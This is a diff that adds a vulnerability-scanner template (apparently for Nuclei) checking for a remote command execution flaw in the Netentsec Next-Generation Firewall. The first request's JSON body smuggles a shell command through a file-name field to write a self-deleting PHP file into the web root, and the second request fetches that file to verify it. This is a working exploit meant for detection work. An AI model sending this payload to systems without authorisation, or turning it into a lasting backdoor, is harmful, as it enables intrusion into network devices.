@@ -1,0 +1,44 @@
+id: netentsec-ngfw-rce
+info:
+  name: Netentsec Next-Generation Firewall Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Exploits an arbitrary command execution vulnerability in Netentsec Next-Generation Firewall. This vulnerability allows execution of commands and creation of a PHP backdoor.
+  reference:
+    - https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
+
+variables:
+  r2: "{{rand_text_alpha(10)}}"
+
+http:
+  - id: create-backdoor
+    method: POST
+    path:
+      - "{{BaseURL}}/directdata/direct/router"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php echo md5({{r2}});unlink(__FILE__);?>' >/var/www/html/{{r2}}.php"]}],"type":"rpc","tid":17}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SSLVPN_Resource"
+          - "\"result\":{\"success\":true}"
+
+  - id: verify-backdoor
+    method: GET
+    path:
+      - "{{BaseURL}}/{{r2}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(r2)}}"
